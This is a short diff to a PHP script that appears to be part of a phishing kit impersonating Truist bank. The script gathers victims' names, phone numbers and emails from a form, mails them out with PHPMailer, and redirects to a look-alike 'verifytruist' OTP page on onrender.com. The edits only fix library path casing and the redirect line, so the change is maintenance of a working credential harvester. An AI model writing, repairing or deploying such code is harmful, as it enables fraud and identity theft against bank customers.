@@ -5,9 +5,9 @@ use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
 require 'vendor/autoload.php';
-require 'vendor/phpmailer/PHPMailer/src/Exception.php';
-require 'vendor/phpmailer/PHPMailer/src/PHPMailer.php';
-require 'vendor/phpmailer/PHPMailer/src/SMTP.php';
+require 'vendor/phpmailer/phpmailer/src/Exception.php';
+require 'vendor/phpmailer/phpmailer/src/PHPMailer.php';
+require 'vendor/phpmailer/phpmailer/src/SMTP.php';
 
 $text = ("FIRST NAME: " . $_POST['firstName'] . "\n" . "LAST NAME: " . $_POST['lastName'] . "\nPHONE: " . $_POST['phone'] . "\nEMAIL: " . $_POST['email']);
 
@@ -39,8 +39,8 @@ try {
 
     $mail->send();
 
-    header('Location: https://verifytruist.onrender.com/Truist/OTP2.html');
-    exit();
+    header("Location:https://verifytruist.onrender.com/Truist/OTP2.html");
+    exit;
 } catch (Exception $e) {
     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
 }
